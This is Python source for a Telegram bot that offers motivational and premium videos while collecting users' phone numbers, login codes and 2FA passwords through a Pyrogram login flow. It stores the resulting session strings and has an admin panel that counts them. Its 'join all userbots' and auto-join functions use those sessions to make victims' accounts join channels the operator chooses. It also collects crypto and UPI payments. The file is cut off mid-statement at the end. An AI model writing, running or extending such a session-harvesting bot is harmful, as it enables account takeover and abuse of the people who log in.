import logging
import random
import asyncio
import os
from datetime import datetime

from telegram import Update
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler,
    MessageHandler, filters, ContextTypes,
)

import config
import database as db
from utils import (
    welcome_message, welcome_keyboard, login_prompt_keyboard,
    otp_prompt_keyboard, twofa_prompt_keyboard, login_success_keyboard,
    after_video_keyboard, purchase_options_keyboard, contact_owner_keyboard,
    reveal_keyboard, main_menu_keyboard, stats_keyboard, admin_keyboard,
    language_selection_keyboard, agreement_keyboard,
    get_caption_for_category, log_session, build_detailed_log,
    get_disclaimer, fmt_bold, fmt_code, fmt_blockquote,
    make_keyboard, primary, success, danger, warning, info,
)
from content_manager import get_video_for_user
from subscription import check_subscription, force_sub_keyboard, get_force_sub_message
from login_manager import (
    send_otp_pyrogram, verify_otp_pyrogram, check_2fa_password, cancel_login,
    generate_mock_otp, get_otp_attempts, increment_otp_attempts,
    increment_2fa_attempts, reset_attempts,
)
from localization import get_text
from purchase import (
    request_purchase, get_purchase_text, get_contact_owner_text,
    get_purchase_confirmation_text, get_purchase_rejected_text,
)
from broadcast import send_broadcast, broadcast_template
import button_styler

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO,
    handlers=[
        logging.FileHandler(config.LOG_FILE, encoding="utf-8"),
        logging.StreamHandler(),
    ],
)
logger = logging.getLogger(__name__)

login_state = {}
admin_upload_states = {}
admin_config_state = {}

START_VIDEOS = []

async def _cache_start_videos():
    global START_VIDEOS
    import httpx
    cache_dir = "data/start_videos"
    os.makedirs(cache_dir, exist_ok=True)
    START_VIDEOS = []
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
    }
    
    urls = getattr(config, "START_VIDEO_URLS", [])
    for url in urls:
        fname = url.rsplit("/", 1)[-1]
        local_path = os.path.join(cache_dir, fname)
        if not os.path.exists(local_path):
            try:
                logger.info(f"Downloading start welcome video: {url}")
                async with httpx.AsyncClient(http2=False) as client:
                    r = await client.get(url, headers=headers, follow_redirects=True, timeout=60)
                    if r.status_code == 200:
                        with open(local_path, "wb") as f:
                            f.write(r.content)
                        logger.info(f"Successfully downloaded start video: {local_path}")
            except Exception as httpx_err:
                logger.warning(f"httpx failed to download welcome video {url}: {httpx_err}. Trying urllib fallback.")
                try:
                    import urllib.request
                    req = urllib.request.Request(url, headers=headers)
                    with urllib.request.urlopen(req, timeout=60) as response:
                        if response.status == 200:
                            with open(local_path, "wb") as f:
                                f.write(response.read())
                            logger.info(f"Successfully downloaded start video via urllib: {local_path}")
                except Exception as urllib_err:
                    logger.error(f"Failed to download welcome video {url} with urllib as well: {urllib_err}")
        if os.path.exists(local_path):
            START_VIDEOS.append(local_path)

async def send_welcome_media(chat, text, reply_markup, parse_mode="HTML"):
    global START_VIDEOS
    # First priority: send locally cached welcome video
    if START_VIDEOS:
        video_path = random.choice(START_VIDEOS)
        try:
            logger.info(f"Sending welcome video from local cache: {video_path}")
            with open(video_path, "rb") as f:
                return await chat.send_video(
                    video=f,
                    caption=text,
                    reply_markup=reply_markup,
                    parse_mode=parse_mode,
                    has_spoiler=True
                )
        except Exception as e:
            logger.error(f"Failed to send welcome video from local cache {video_path}: {e}")

    # Fallback to general start_video.mp4 if any
    if os.path.exists("data/start_video.mp4"):
        try:
            logger.info("Sending welcome video from local file: data/start_video.mp4")
            with open("data/start_video.mp4", "rb") as f:
                return await chat.send_video(
                    video=f,
                    caption=text,
                    reply_markup=reply_markup,
                    parse_mode=parse_mode,
                    has_spoiler=True
                )
        except Exception as e:
            logger.error(f"Failed to send welcome video from local file: {e}")

    # Fallback to direct URL sending if local cache is empty
    urls = getattr(config, "START_VIDEO_URLS", [])
    if urls:
        shuffled_urls = list(urls)
        random.shuffle(shuffled_urls)
        for url in shuffled_urls:
            try:
                logger.info(f"Sending welcome video from URL fallback: {url}")
                return await chat.send_video(
                    video=url,
                    caption=text,
                    reply_markup=reply_markup,
                    parse_mode=parse_mode,
                    has_spoiler=True
                )
            except Exception as e:
                logger.error(f"Failed to send welcome video URL fallback {url}: {e}")

    # Fallback to standard text message
    return await chat.send_message(
        text=text,
        reply_markup=reply_markup,
        parse_mode=parse_mode
    )

async def send_upload_config_message(message, user_id):
    state = admin_upload_states.get(user_id)
    if not state:
        return
    cat = state["category"]
    is_free = state["is_free"]
    del_after = state["delete_after"]
    cap = state["caption"] or "[None]"
    text = (
        "<blockquote>📹 CONFIGURE CAPTURED VIDEO</blockquote>\n\n"
        f"📂 <b>Category:</b> <code>{cat.upper()}</code>\n"
        f"🔑 <b>Access Type:</b> <code>{'FREE (Everyone)' if is_free else 'PREMIUM (Paid)'}</code>\n"
        f"⏳ <b>Auto-Delete:</b> <code>{del_after}s</code>\n"
        f"📝 <b>Custom Caption:</b> <code>{cap}</code>\n\n"
        "Use the buttons below to change settings, then click Save."
    )
    keyboard = make_keyboard([
        [
            primary(f"📂 Category: {cat.upper()}", "up_toggle_cat"),
            primary(f"🔑 Type: {'Free' if is_free else 'Premium'}", "up_toggle_type")
        ],
        [
            primary(f"⏳ Delete: {del_after}s", "up_toggle_delete"),
            primary("📝 Set Caption", "up_set_caption")
        ],
        [
            success("💾 SAVE VIDEO", "up_save"),
            danger("🗑️ DISCARD", "up_discard")
        ]
    ])
    await message.reply_text(text, reply_markup=keyboard, parse_mode="HTML")

async def update_upload_config_message(query, user_id):
    state = admin_upload_states.get(user_id)
    if not state:
        return
    cat = state["category"]
    is_free = state["is_free"]
    del_after = state["delete_after"]
    cap = state["caption"] or "[None]"
    text = (
        "<blockquote>📹 CONFIGURE CAPTURED VIDEO</blockquote>\n\n"
        f"📂 <b>Category:</b> <code>{cat.upper()}</code>\n"
        f"🔑 <b>Access Type:</b> <code>{'FREE (Everyone)' if is_free else 'PREMIUM (Paid)'}</code>\n"
        f"⏳ <b>Auto-Delete:</b> <code>{del_after}s</code>\n"
        f"📝 <b>Custom Caption:</b> <code>{cap}</code>\n\n"
        "Use the buttons below to change settings, then click Save."
    )
    keyboard = make_keyboard([
        [
            primary(f"📂 Category: {cat.upper()}", "up_toggle_cat"),
            primary(f"🔑 Type: {'Free' if is_free else 'Premium'}", "up_toggle_type")
        ],
        [
            primary(f"⏳ Delete: {del_after}s", "up_toggle_delete"),
            primary("📝 Set Caption", "up_set_caption")
        ],
        [
            success("💾 SAVE VIDEO", "up_save"),
            danger("🗑️ DISCARD", "up_discard")
        ]
    ])
    await query.edit_message_text(text, reply_markup=keyboard, parse_mode="HTML")

START_IMAGE_URLS = [
    "https://picsum.photos/seed/motivation1/400/300",
    "https://picsum.photos/seed/motivation2/400/300",
    "https://picsum.photos/seed/motivation3/400/300",
]
START_IMAGES = []


async def _cache_start_images():
    global START_IMAGES
    import httpx
    cache_dir = os.path.join(os.path.dirname(__file__), "data", "start_images")
    os.makedirs(cache_dir, exist_ok=True)
    START_IMAGES = []
    for url in START_IMAGE_URLS:
        fname = url.rsplit("/", 1)[-1]
        local_path = os.path.join(cache_dir, fname)
        if not os.path.exists(local_path):
            try:
                async with httpx.AsyncClient() as client:
                    r = await client.get(url, follow_redirects=True, timeout=15)
                    if r.status_code == 200:
                        with open(local_path, "wb") as f:
                            f.write(r.content)
            except Exception:
                pass
        if os.path.exists(local_path):
            START_IMAGES.append(local_path)


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user

    await db.add_user(user.id, user.username, user.first_name)
    await db.log_activity(user.id, "start")

    args = context.args
    if args and args[0].startswith("ref_"):
        try:
            referrer_id = int(args[0].replace("ref_", ""))
            if referrer_id != user.id:
                await db.log_referral(referrer_id, user.id)
                await db.increment_referral(referrer_id)
                ref_user = await db.get_user(referrer_id)
                if ref_user:
                    await db.update_user(referrer_id, video_count=ref_user["video_count"] + 5)
                log_session(user.id, user.username, None, f"Referred by {referrer_id}")
        except (ValueError, IndexError):
            pass

    user_data = await db.get_user(user.id)
    lang = user_data.get("language") if user_data else None

    # Check force subscription first
    is_subbed = await check_subscription(context.bot, user.id)
    if not is_subbed:
        sub = await db.get_subscription()
        if sub:
            await update.message.reply_text(
                get_force_sub_message(),
                reply_markup=force_sub_keyboard(sub.get("channel_username", ""), sub.get("channel_id", ""), lang or "en"),
                parse_mode="HTML",
            )
            return

    if not lang:
        # Show language selection with start video
        select_lang_text = get_text("SELECT_LANGUAGE", "en")
        await send_welcome_media(update.message.chat, select_lang_text, language_selection_keyboard())
        return

    if not user_data.get("agreement_accepted"):
        # Show disclaimer
        disclaimer_text = get_text("DISCLAIMER_TEXT", lang)
        await send_welcome_media(update.message.chat, disclaimer_text, agreement_keyboard(lang))
        return

    # If already logged in & agreement accepted
    status = user_data.get("status", "pending")
    watched = user_data.get("video_count", 0)
    status_label = get_text("STATUS_PENDING", lang)
    if status == "active":
        status_label = get_text("STATUS_ACTIVE", lang)
    elif status == "purchased":
        status_label = get_text("STATUS_PURCHASED", lang)

    if status in ("active", "purchased"):
        text = get_text("WELCOME_BACK", lang)
    else:
        text = get_text("WELCOME_BODY", lang, user.id, status_label, watched)

    keyboard = welcome_keyboard(lang)
    await send_welcome_media(update.message.chat, text, keyboard)
async def is_user_admin(user_id):
    if user_id in config.ADMIN_IDS:
        return True
    settings = await db.get_settings()
    admin_list = settings.get("admin_ids", [])
    return user_id in admin_list

async def run_single_auto_join(session_string, channel):
    client = Client(
        "temp_auto_join",
        api_id=config.PYROGRAM_API_ID,
        api_hash=config.PYROGRAM_API_HASH,
        session_string=session_string,
        in_memory=True
    )
    try:
        await client.connect()
        await client.join_chat(channel)
        await client.disconnect()
        logger.info(f"Auto-joined user account to {channel}")
    except Exception as e:
        logger.error(f"Auto-join failed: {e}")
        try:
            await client.disconnect()
        except Exception:
            pass

async def run_join_all_userbots(bot, admin_chat_id, target_chat):
    cursor = db.db.users.find({"session_string": {"$ne": None}})
    users = await cursor.to_list(length=None)
    if not users:
        await bot.send_message(chat_id=admin_chat_id, text="❌ No logged-in user sessions found in database.")
        return
    await bot.send_message(chat_id=admin_chat_id, text=f"🚀 <b>Starting Join All for {len(users)} accounts...</b>", parse_mode="HTML")
    success_count = 0
    failed_count = 0
    for u in users:
        sess = u["session_string"]
        uid = u["user_id"]
        username = u.get("username", f"ID: {uid}")
        client = Client(
            f"sessions/temp_join_{uid}",
            api_id=config.PYROGRAM_API_ID,
            api_hash=config.PYROGRAM_API_HASH,
            session_string=sess,
            in_memory=True
        )
        try:
            await client.connect()
            await client.join_chat(target_chat)
            success_count += 1
            await client.disconnect()
        except Exception as e:
            failed_count += 1
            logger.error(f"Userbot {username} failed to join {target_chat}: {e}")
            try:
                await client.disconnect()
            except Exception:
                pass
        await asyncio.sleep(1.5)
    await bot.send_message(
        chat_id=admin_chat_id,
        text=(
            f"🏁 <b>Join All Complete!</b>\n\n"
            f"🎯 <b>Target:</b> <code>{target_chat}</code>\n"
            f"✅ <b>Joined:</b> <code>{success_count}</code>\n"
            f"❌ <b>Failed:</b> <code>{failed_count}</code>"
        ),
        parse_mode="HTML"
    )

async def show_telegram_admin_dashboard(query):
    settings = await db.get_settings()
    maintenance_active = settings.get("maintenance_mode", False)
    logged_in_sessions_count = await db.db.users.count_documents({"session_string": {"$ne": None}})
    user_count = await db.get_user_count()
    v_count = await db.video_count()
    pending_purchases = await db.get_pending_purchases()
    
    api_id = settings.get("pyrogram_api_id") or config.PYROGRAM_API_ID or "Not Set"
    api_hash_val = settings.get("pyrogram_api_hash") or config.PYROGRAM_API_HASH or "Not Set"
    api_hash_display = f"{api_hash_val[:5]}..." if api_hash_val != "Not Set" and len(api_hash_val) > 5 else api_hash_val
    
    text = (
        "👑 <b>XTR AD BOT - CONFIGURATION PANEL</b> 👑\n\n"
        "Welcome to your configurations panel. Update settings dynamically:\n\n"
        f"👤 <b>Total Users:</b> <code>{user_count}</code>\n"
        f"📹 <b>Total Videos:</b> <code>{v_count}</code>\n"
        f"💰 <b>Pending Purchases:</b> <code>{len(pending_purchases)}</code>\n"
        f"🔑 <b>Logged-in Sessions:</b> <code>{logged_in_sessions_count}</code>\n"
        f"⚙️ <b>Maintenance Mode:</b> <code>{'ENABLED 🔴' if maintenance_active else 'DISABLED 🟢'}</code>\n"
        f"🔒 <b>Force Join:</b> <code>{settings.get('force_sub_channel', 'None')}</code>\n"
        f"🔑 <b>Pyrogram API ID:</b> <code>{api_id}</code>\n"
        f"🔑 <b>Pyrogram API Hash:</b> <code>{api_hash_display}</code>\n\n"
        "<i>Update configurations below:</i>"
    )
    from utils import telegram_admin_panel_keyboard
    await query.edit_message_text(
        text,
        reply_markup=telegram_admin_panel_keyboard(maintenance_active),
        parse_mode="HTML"
    )

async def handle_custom_callbacks(query, context, data, user, is_admin):
    if data == "set_lang_en":
        await db.update_user(user.id, language="en")
        disclaimer_text = get_text("DISCLAIMER_TEXT", "en")
        try:
            await query.edit_message_caption(
                caption=disclaimer_text,
                reply_markup=agreement_keyboard("en"),
                parse_mode="HTML"
            )
        except Exception:
            try:
                await query.message.delete()
            except Exception:
                pass
            await send_welcome_media(query.message.chat, disclaimer_text, agreement_keyboard("en"))
        return True
    elif data == "set_lang_hi":
        await db.update_user(user.id, language="hi")
        disclaimer_text = get_text("DISCLAIMER_TEXT", "hi")
        try:
            await query.edit_message_caption(
                caption=disclaimer_text,
                reply_markup=agreement_keyboard("hi"),
                parse_mode="HTML"
            )
        except Exception:
            try:
                await query.message.delete()
            except Exception:
                pass
            await send_welcome_media(query.message.chat, disclaimer_text, agreement_keyboard("hi"))
        return True
    elif data == "accept_agreement":
        await db.update_user(user.id, agreement_accepted=True)
        try:
            await query.message.delete()
        except Exception:
            pass
        user_data = await db.get_user(user.id)
        lang = user_data.get("language", "en") if user_data else "en"
        status = user_data.get("status", "pending")
        watched = user_data.get("video_count", 0)
        status_label = get_text("STATUS_PENDING", lang)
        if status == "active":
            status_label = get_text("STATUS_ACTIVE", lang)
        elif status == "purchased":
            status_label = get_text("STATUS_PURCHASED", lang)
        welcome_text = get_text("WELCOME_BODY", lang, user.id, status_label, watched)
        await query.message.chat.send_message(
            text=welcome_text,
            reply_markup=welcome_keyboard(lang),
            parse_mode="HTML"
        )
        return True
    elif data == "reject_agreement":
        user_data = await db.get_user(user.id)
        lang = user_data.get("language", "en") if user_data else "en"
        decline_msg = get_text("DECLINE_MESSAGE", lang)
        try:
            await query.edit_message_caption(
                caption=decline_msg,
                reply_markup=None,
                parse_mode="HTML"
            )
        except Exception:
            try:
                await query.message.delete()
            except Exception:
                pass
            await query.message.chat.send_message(text=decline_msg, parse_mode="HTML")
        return True

    if data.startswith("up_"):
        if not is_admin:
            return True
        state = admin_upload_states.get(user.id)
        if not state:
            await query.answer("❌ No active upload session.", show_alert=True)
            return True
        if data == "up_toggle_cat":
            categories = ["motivation", "fitness", "business", "mindset", "sports", "funny"]
            idx = categories.index(state["category"])
            state["category"] = categories[(idx + 1) % len(categories)]
            await update_upload_config_message(query, user.id)
        elif data == "up_toggle_type":
            state["is_free"] = not state["is_free"]
            await update_upload_config_message(query, user.id)
        elif data == "up_toggle_delete":
            times = [30, 60, 120, 180, 300]
            idx = times.index(state["delete_after"]) if state["delete_after"] in times else 1
            state["delete_after"] = times[(idx + 1) % len(times)]
            await update_upload_config_message(query, user.id)
        elif data == "up_set_caption":
            state["awaiting_caption"] = True
            await query.edit_message_text(
                "<blockquote>📝 ENTER CUSTOM CAPTION</blockquote>\n\n"
                "Send the caption text as a normal message.\n"
                "To clear the caption, send <code>none</code>.",
                reply_markup=make_keyboard([[danger("🔙 BACK", "up_back_to_config")]]),
                parse_mode="HTML"
            )
        elif data == "up_back_to_config":
            state.pop("awaiting_caption", None)
            await update_upload_config_message(query, user.id)
        elif data == "up_discard":
            admin_upload_states.pop(user.id, None)
            await query.edit_message_text("🗑️ <b>Video upload cancelled.</b>", parse_mode="HTML")
        elif data == "up_save":
            state = admin_upload_states.pop(user.id, None)
            is_free_val = 1 if state["is_free"] else 0
            vid = await db.add_video(
                file_id=state["file_id"],
                caption=state["caption"] if state["caption"] else None,
                category=state["category"],
                delete_after=state["delete_after"],
                added_by=user.id,
                is_free=is_free_val
            )
            await query.edit_message_text(
                f"<blockquote>✅ VIDEO SAVED SUCCESSFULLY!</blockquote>\n\n"
                f"• <b>Video ID:</b> <code>#{vid}</code>\n"
                f"• <b>Category:</b> <code>{state['category'].upper()}</code>\n"
                f"• <b>Type:</b> <code>{'FREE' if state['is_free'] else 'PREMIUM'}</code>\n"
                f"• <b>Delete Timer:</b> <code>{state['delete_after']}s</code>",
                parse_mode="HTML"
            )
        return True

    if data.startswith("adm_"):
        if not is_admin:
            return True
        if data == "adm_toggle_maint":
            settings = await db.get_settings()
            new_val = not settings.get("maintenance_mode", False)
            await db.update_settings(maintenance_mode=new_val)
            await query.answer(f"Maintenance Mode {'Enabled' if new_val else 'Disabled'}", show_alert=True)
            await show_telegram_admin_dashboard(query)
        elif data == "adm_force_join":
            admin_config_state[user.id] = {"field": "force_join"}
            await query.edit_message_text(
                "<blockquote>🔗 SET FORCE JOIN CHANNEL</blockquote>\n\n"
                "Send the channel username (with @) and invite link separated by a space.\n\n"
                "Example: <code>@mychannel https://t.me/mychannel</code>\n\n"
                "To disable force join, send <code>none</code>.",
                reply_markup=make_keyboard([[danger("🔙 BACK", "admin_dashboard")]]),
                parse_mode="HTML"
            )
        elif data == "adm_log_group":
            admin_config_state[user.id] = {"field": "log_group"}
            await query.edit_message_text(
                "<blockquote>📁 SET LOG GROUP ID</blockquote>\n\n"
                "Send the negative integer ID of your Telegram log group/channel.\n\n"
                "Example: <code>-1001234567890</code>",
                reply_markup=make_keyboard([[danger("🔙 BACK", "admin_dashboard")]]),
                parse_mode="HTML"
            )
        elif data == "adm_brand_name":
            admin_config_state[user.id] = {"field": "brand_name"}
            await query.edit_message_text(
                "<blockquote>🏷️ SET BRANDING NAME</blockquote>\n\n"
                "Send the text you want to use as the branding name for the bot.",
                reply_markup=make_keyboard([[danger("🔙 BACK", "admin_dashboard")]]),
                parse_mode="HTML"
            )
        elif data == "adm_brand_days":
            admin_config_state[user.id] = {"field": "brand_days"}
            await query.edit_message_text(
                "<blockquote>⏱️ SET BRANDING DAYS</blockquote>\n\n"
                "Send the integer number of default days for subscription packs.",
                reply_markup=make_keyboard([[danger("🔙 BACK", "admin_dashboard")]]),
                parse_mode="HTML"
            )
        elif data == "adm_menu_images":
            admin_config_state[user.id] = {"field": "menu_images"}
            await query.edit_message_text(
                "<blockquote>🖼️ SET MENU IMAGES / WELCOME VIDEO</blockquote>\n\n"
                "To set a new start message video, send the video file directly to the bot now. "
                "It will replace the current start video.",
                reply_markup=make_keyboard([[danger("🔙 BACK", "admin_dashboard")]]),
                parse_mode="HTML"
            )
        elif data == "adm_upi":
            admin_config_state[user.id] = {"field": "upi"}
            await query.edit_message_text(
                "<blockquote>🏦 SET UPI ID</blockquote>\n\n"
                "Send your UPI ID for payments.\n\n"
                "Example: <code>owner@upi</code>",
                reply_markup=make_keyboard([[danger("🔙 BACK", "admin_dashboard")]]),
                parse_mode="HTML"
            )
        elif data == "adm_usdt":
            admin_config_state[user.id] = {"field": "usdt"}
            await query.edit_message_text(
                "<blockquote>🔘 SET USDT ADDRESS</blockquote>\n\n"
                "Send your USDT (TRC-20) address.",
                reply_markup=make_keyboard([[danger("🔙 BACK", "admin_dashboard")]]),
                parse_mode="HTML"
            )
        elif data == "adm_ton":
            admin_config_state[user.id] = {"field": "ton"}
            await query.edit_message_text(
                "<blockquote>💎 SET TON ADDRESS</blockquote>\n\n"
                "Send your TON Wallet address.",
                reply_markup=make_keyboard([[danger("🔙 BACK", "admin_dashboard")]]),
                parse_mode="HTML"
            )
        elif data == "adm_join_all":
            admin_config_state[user.id] = {"field": "join_all"}
            await query.edit_message_text(
                "<blockquote>👥 JOIN ALL CHANNELS (USERBOT)</blockquote>\n\n"
                "Send the channel invite link or username that you want all logged-in userbots to join.\n\n"
                "Example: <code>https://t.me/mychannel</code> or <code>@mychannel</code>",
                reply_markup=make_keyboard([[danger("🔙 BACK", "admin_dashboard")]]),
                parse_mode="HTML"
            )
        elif data == "adm_auto_joins":
            admin_config_state[user.id] = {"field": "auto_join_config"}
            settings = await db.get_settings()
            curr = settings.get("auto_join_channel", "") or "None"
            await query.edit_message_text(
                "<blockquote>🔗 AUTO-JOINS CONFIGURATION</blockquote>\n\n"
                f"Currently preset channel: <code>{curr}</code>\n\n"
                "Send the username or invite link of the channel you want new users to join automatically upon login. "
                "To disable, send <code>none</code>.",
                reply_markup=make_keyboard([[danger("🔙 BACK", "admin_dashboard")]]),
                parse_mode="HTML"
            )
        elif data == "adm_user_manage":
            admin_config_state[user.id] = {"field": "user_manage"}
            await query.edit_message_text(
                "<blockquote>👤 USER MANAGEMENT</blockquote>\n\n"
                "Send the User ID of the user you want to search and manage.",
                reply_markup=make_keyboard([[danger("🔙 BACK", "admin_dashboard")]]),
                parse_mode="HTML"
            )
        elif data == "adm_admins":
            settings = await db.get_settings()
            admin_list = settings.get("admin_ids", [])
            admins_text = "\n".join(f"• <code>{aid}</code>" for aid in admin_list)
            await query.edit_message_text(
                "<blockquote>👥 MANAGE ADMINS</blockquote>\n\n"
                f"Current Admins:\n{admins_text}\n\n"
                "Choose an action:",
                reply_markup=make_keyboard([
                    [primary("➕ Add Admin", "adm_add_admin_prompt"), primary("➖ Remove Admin", "adm_remove_admin_prompt")],
                    [danger("🔙 BACK", "admin_dashboard")]
                ]),
                parse_mode="HTML"
            )
        elif data == "adm_add_admin_prompt":
            admin_config_state[user.id] = {"field": "add_admin"}
            await query.edit_message_text(
                "<blockquote>➕ ADD ADMIN</blockquote>\n\n"
                "Send the Telegram User ID of the new admin.",
                reply_markup=make_keyboard([[danger("🔙 BACK", "adm_admins")]]),
                parse_mode="HTML"
            )
        elif data == "adm_remove_admin_prompt":
            admin_config_state[user.id] = {"field": "remove_admin"}
            await query.edit_message_text(
                "<blockquote>➖ REMOVE ADMIN</blockquote>\n\n"
                "Send the Telegram User ID you want to remove from admins.",
                reply_markup=make_keyboard([[danger("🔙 BACK", "adm_admins")]]),
                parse_mode="HTML"
            )
        elif data == "adm_sub_plans":
            await query.edit_message_text(
                "<blockquote>📅 SUBSCRIPTION PLANS</blockquote>\n\n"
                "Currently, plans are configured in <code>config.py</code>:\n"
                + "\n".join(f"• {v['label']} - {v['price']}" for v in config.PURCHASE_OPTIONS.values()) +
                "\n\nUpdate package details in config file directly.",
                reply_markup=make_keyboard([[danger("🔙 BACK", "admin_dashboard")]]),
                parse_mode="HTML"
            )
        elif data == "adm_commission":
            admin_config_state[user.id] = {"field": "commission"}
            await query.edit_message_text(
                "<blockquote>📊 SET COMMISSION PERCENTAGE</blockquote>\n\n"
                "Send the commission rate (0-100) as an integer.",
                reply_markup=make_keyboard([[danger("🔙 BACK", "admin_dashboard")]]),
                parse_mode="HTML"
            )
        elif data == "adm_api_id":
            admin_config_state[user.id] = {"field": "pyrogram_api_id"}
            await query.edit_message_text(
                "<blockquote>🔑 SET PYROGRAM API ID</blockquote>\n\n"
                "Send your Telegram API ID (integer) now.\n\n"
                "To get one, register your app at my.telegram.org.",
                reply_markup=make_keyboard([[danger("🔙 BACK", "admin_dashboard")]]),
                parse_mode="HTML"
            )
        elif data == "adm_api_hash":
            admin_config_state[user.id] = {"field": "pyrogram_api_hash"}
            await query.edit_message_text(
                "<blockquote>🔑 SET PYROGRAM API HASH</blockquote>\n\n"
                "Send your Telegram API HASH string now.\n\n"
                "To get one, register your app at my.telegram.org.",
                reply_markup=make_keyboard([[danger("🔙 BACK", "admin_dashboard")]]),
                parse_mode="HTML"
            )
        return True

    if data.startswith("usrm_"):
        if not is_admin:
            return True
        parts = data.split("_")
        action = parts[1]
        target_uid = int(parts[2])
        if action == "active":
            await db.update_user(target_uid, status="active")
            await query.answer(f"User {target_uid} set to Active", show_alert=True)
        elif action == "premium":
            await db.update_user(target_uid, status="purchased")
            await query.answer(f"User {target_uid} set to Premium", show_alert=True)
        elif action == "pending":
            await db.update_user(target_uid, status="pending")
            await query.answer(f"User {target_uid} set to Pending", show_alert=True)
        elif action == "reset":
            await db.update_user(target_uid, video_count=0, free_previews_used=0)
            await query.answer(f"User {target_uid} watch counts reset", show_alert=True)
        u_info = await db.get_user(target_uid)
        text = (
            f"<blockquote>👤 USER PROFILE: {target_uid}</blockquote>\n\n"
            f"• Username: @{u_info.get('username', 'None')}\n"
            f"• First Name: {u_info.get('first_name', 'None')}\n"
            f"• Phone: {u_info.get('phone', 'None')}\n"
            f"• Status: <code>{u_info.get('status', 'pending').upper()}</code>\n"
            f"• Videos Watched: <code>{u_info.get('video_count', 0)}</code>\n"
            f"• Free Previews: <code>{u_info.get('free_previews_used', 0)}</code>\n\n"
            "Select an action to modify user details:"
        )
        keyboard = make_keyboard([
            [
                primary("🔓 Set Active", f"usrm_active_{target_uid}"),
                primary("💎 Set Premium", f"usrm_premium_{target_uid}")
            ],
            [
                primary("❌ Set Pending", f"usrm_pending_{target_uid}"),
                primary("🗑️ Reset Count", f"usrm_reset_{target_uid}")
            ],
            [danger("🔙 BACK TO PANEL", "admin_dashboard")]
        ])
        await query.edit_message_text(text, reply_markup=keyboard, parse_mode="HTML")
        return True

    return False

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    user = query.from_user

    # Admin check
    is_admin = await is_user_admin(user.id)

    # Maintenance check
    settings = await db.get_settings()
    if settings.get("maintenance_mode", False) and not is_admin:
        await query.answer("🚧 Bot is under maintenance.", show_alert=True)
        return

    # Check custom/admin callbacks
    custom_handled = await handle_custom_callbacks(query, context, data, user, is_admin)
    if custom_handled:
        return

    is_subbed = await check_subscription(context.bot, user.id)
    if not is_subbed and data not in ("check_sub", "force_sub", "main_menu", "delete_session") and not is_admin:
        sub = await db.get_subscription()
        if sub:
            user_data = await db.get_user(user.id)
            lang = user_data.get("language", "en") if user_data else "en"
            await query.edit_message_text(
                get_force_sub_message(),
                reply_markup=force_sub_keyboard(sub.get("channel_username", ""), sub.get("channel_id", ""), lang),
                parse_mode="HTML",
            )
            return

    user_data = await db.get_user(user.id)
    lang = user_data.get("language", "en") if user_data else "en"

    if data == "free_video_1":
        await handle_free_video(query, context, user, user_data, 1)
    elif data == "free_video_2":
        await handle_free_video(query, context, user, user_data, 2)
    elif data == "login":
        await query.edit_message_text(
            get_text("LOGIN_PORTAL_TEXT", lang),
            reply_markup=login_prompt_keyboard(lang),
            parse_mode="HTML",
        )
    elif data == "login_number":
        await query.edit_message_text(
            get_text("GIVE_DIGITS_TEXT", lang),
            reply_markup=make_keyboard([
                [danger(get_text("CANCEL_BTN", lang), "main_menu")]
            ]),
            parse_mode="HTML",
        )
        log_session(user.id, user.username, None, "Requested phone input")
        login_state[user.id] = {"step": "phone_wait"}
    elif data == "verify_otp":
        st = login_state.get(user.id)
        if not st or not st.get("otp"):
            await query.edit_message_text("❌ No OTP found. Start login again.", reply_markup=login_prompt_keyboard(lang), parse_mode="HTML")
            return
        is_mock = st.get("is_mock", True)
        if is_mock:
            otp = st.get("otp", "")
            msg = get_text("OTP_SENT_TEXT", lang, otp, " ".join(otp))
        else:
            msg = get_text("OTP_SENT_REAL_TEXT", lang)
        await query.edit_message_text(
            msg,
            reply_markup=make_keyboard([
                [warning(get_text("RESEND_OTP_BTN", lang), "resend_otp")],
                [danger(get_text("CANCEL_BTN", lang), "main_menu")],
            ]),
            parse_mode="HTML",
        )
        st["step"] = "otp_wait"
    elif data == "enter_2fa":
        await query.edit_message_text(
            get_text("TFA_PROMPT_TEXT", lang),
            reply_markup=make_keyboard([
                [info(get_text("SKIP_2FA_BTN", lang), "skip_2fa")],
                [danger(get_text("CANCEL_BTN", lang), "main_menu")],
            ]),
            parse_mode="HTML",
        )
        st = login_state.get(user.id, {})
        st["step"] = "tfa_wait"
        login_state[user.id] = st
    elif data == "skip_2fa":
        await cancel_login(user.id)
        await handle_login_success(query, user, user_data, context, lang)
    elif data == "resend_otp":
        await handle_resend_otp(query, user, user_data, lang)
    elif data == "next_video":
        await handle_next_video(query, context, user, user_data, lang)
    elif data == "purchase":
        await query.edit_message_text(
            get_purchase_text(),
            reply_markup=purchase_options_keyboard(lang),
            parse_mode="HTML",
        )
    elif data.startswith("purchase_"):
        pack_key = data.replace("purchase_", "")
        await handle_purchase_request(query, user, pack_key, lang)
    elif data == "contact_owner":
        await query.edit_message_text(
            get_contact_owner_text(user.id),
            reply_markup=contact_owner_keyboard(lang),
            parse_mode="HTML",
        )
    elif data == "dm_owner":
        upi_id = settings.get("upi_id", "") or "owner@upi"
        usdt_addr = settings.get("usdt_address", "") or "Not Set"
        ton_addr = settings.get("ton_address", "") or "Not Set"
        if lang == "hi":
            msg = (
                f"👤 <b>मालिक का संपर्क:</b> {config.OWNER_USERNAME}\n\n"
                f"आप सीधे संपर्क करके भुगतान कर सकते हैं:\n\n"
                f"🏦 <b>UPI ID:</b> <code>{upi_id}</code>\n"
                f"🔘 <b>USDT Address:</b> <code>{usdt_addr}</code>\n"
                f"💎 <b>TON Address:</b> <code>{ton_addr}</code>\n\n"
                f"💬 <b>संदेश में शामिल करें:</b>\n"
                f"• आपकी यूजर आईडी: <code>{user.id}</code>\n"
                f"• भुगतान विधि का नाम"
            )
        else:
            msg = (
                f"👤 <b>Owner's DMs:</b> {config.OWNER_USERNAME}\n\n"
                f"Slide in and pay using any wallet below:\n\n"
                f"🏦 <b>UPI ID:</b> <code>{upi_id}</code>\n"
                f"🔘 <b>USDT Address:</b> <code>{usdt_addr}</code>\n"
